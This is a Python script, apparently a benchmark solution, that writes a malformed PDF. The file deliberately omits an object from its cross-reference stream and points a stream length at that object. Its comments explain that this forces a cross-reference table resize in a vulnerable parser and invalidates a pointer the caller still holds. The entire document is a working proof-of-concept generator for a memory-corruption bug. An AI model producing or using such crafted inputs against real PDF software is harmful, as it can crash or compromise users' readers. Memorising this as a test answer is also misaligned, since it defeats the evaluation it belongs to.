import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        writer = PDFWriter()
        writer.add_header("1.5")
        
        # Obj 1: Catalog
        writer.add_object(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        
        # Obj 2: Pages
        # References Obj 100 as a child page. This forces Obj 100 to be loaded.
        writer.add_object(2, b"<< /Type /Pages /Kids [100 0 R] /Count 1 >>")
        
        # Obj 100: Page (Inside ObjStm 50)
        # Content: << /Type /Page /Parent 2 0 R /MediaBox [0 0 600 600] >>
        obj100_content = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 600] >>"
        
        # Obj 50: ObjStm
        # Header: "100 0" (obj_num offset)
        stm_header = b"100 0"
        stm_data = stm_header + b"\n" + obj100_content
        first_offset = len(stm_header) + 1
        
        # We set /Length to 200 0 R. 
        # Obj 200 is NOT in the initial XRef range (which we will set to 0..100).
        # Loading Obj 50 (to get Obj 100) forces resolution of /Length (Obj 200).
        # Resolving 200 triggers XRef table resize in the vulnerable version.
        # This invalidates the pointer to Obj 100's xref entry held by the caller.
        writer.add_object(50, 
            f"<< /Type /ObjStm /N 1 /First {first_offset} /Length 200 0 R >>".encode('latin-1'), 
            stream=stm_data)
            
        # Obj 200: Length value.
        # It exists in the file body.
        writer.add_object(200, b"50")
        
        # Finalize with XRef Stream (Obj 10)
        # Entries to include in XRef: 1, 2, 50. (200 is intentionally excluded from XRef)
        # Compressed: 100 in 50.
        return writer.finalize(xref_obj_id=10, root_id=1, 
                               entries=[1, 2, 50],
                               compressed=[(100, 50, 0)])

class PDFWriter:
    def __init__(self):
        self.buffer = bytearray()
        self.offsets = {}
        
    def add_header(self, version):
        self.buffer.extend(f"%PDF-{version}\n%\xe2\xe3\xcf\xd3\n".encode('latin-1'))
        
    def add_object(self, obj_id, content, stream=None):
        self.offsets[obj_id] = len(self.buffer)
        self.buffer.extend(f"{obj_id} 0 obj\n".encode('latin-1'))
        self.buffer.extend(content)
        if stream is not None:
            self.buffer.extend(b"\nstream\n")
            self.buffer.extend(stream)
            self.buffer.extend(b"\nendstream")
        self.buffer.extend(b"\nendobj\n")
        
    def finalize(self, xref_obj_id, root_id, entries, compressed):
        xref_offset = len(self.buffer)
        self.offsets[xref_obj_id] = xref_offset
        
        xref_data = {}
        # Entry 0: Free
        xref_data[0] = b'\x00\x00\x00\x00\xff'
        
        # Normal entries
        for eid in entries:
            off = self.offsets.get(eid, 0)
            # Type 1: [1] [offset 3b] [gen 1b]
            entry = struct.pack('>B', 1) + struct.pack('>I', off)[1:] + b'\x00'
            xref_data[eid] = entry
            
        # Self (XRef stream)
        entry = struct.pack('>B', 1) + struct.pack('>I', xref_offset)[1:] + b'\x00'
        xref_data[xref_obj_id] = entry
        
        # Compressed entries
        for (eid, stm, idx) in compressed:
            # Type 2: [2] [stm 3b] [idx 1b]
            entry = struct.pack('>B', 2) + struct.pack('>I', stm)[1:] + struct.pack('>B', idx)
            xref_data[eid] = entry
            
        # Size covers up to 100. 200 is out of bounds.
        max_id = 100
        
        stream_data = bytearray()
        for i in range(max_id + 1):
            if i in xref_data:
                stream_data.extend(xref_data[i])
            else:
                stream_data.extend(b'\x00\x00\x00\x00\xff')
                
        self.buffer.extend(f"{xref_obj_id} 0 obj\n".encode('latin-1'))
        # W [1 3 1] = 5 bytes per entry
        dict_str = f"<< /Type /XRef /Size {max_id + 1} /W [1 3 1] /Root {root_id} 0 R /Length {len(stream_data)} >>"
        self.buffer.extend(dict_str.encode('latin-1'))
        self.buffer.extend(b"\nstream\n")
        self.buffer.extend(stream_data)
        self.buffer.extend(b"\nendstream\nendobj\n")
        
        self.buffer.extend(b"startxref\n")
        self.buffer.extend(f"{xref_offset}\n".encode('latin-1'))
        self.buffer.extend(b"%%EOF\n")
        
        return bytes(self.buffer)
